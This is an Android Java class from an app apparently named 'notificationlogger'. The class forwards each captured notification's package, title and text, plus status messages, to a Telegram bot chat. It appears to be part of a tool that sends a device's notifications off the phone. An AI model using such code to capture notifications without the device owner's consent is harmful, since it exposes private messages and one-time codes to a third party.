package com.example.notificationlogger;

import android.util.Log;
import okhttp3.*;
import java.io.IOException;

public class TelegramBotManager {
    private final String botToken;
    private final String chatId;
    private final OkHttpClient httpClient = new OkHttpClient();
    private static final String TAG = "NotifyLogger";

    public TelegramBotManager(String botToken, String chatId) {
        this.botToken = botToken;
        this.chatId = chatId;
    }

    public void sendNotificationLog(NotificationLog log) {
        // Prepare the message
        String message = "Package: " + log.getPackageName() + "\n" +
                         "Title: " + log.getTitle() + "\n" +
                         "Text: " + log.getText();

        sendToTelegram(message);
    }

    public void sendStatusMessage(String message) {
        sendToTelegram("🚀 STATUS Update: " + message);
    }

    private void sendToTelegram(String message) {
        // Use FormBody (URL-encoded) as suggested - it's very reliable
        RequestBody body = new FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", message)
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + botToken + "/sendMessage")
                .post(body)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Telegram API Failure: " + e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d(TAG, "✅ Message sent successfully!");
                } else {
                    Log.e(TAG, "❌ Telegram Error: " + response.code() + " - " + response.body().string());
                }
                response.close();
            }
        });
    }
}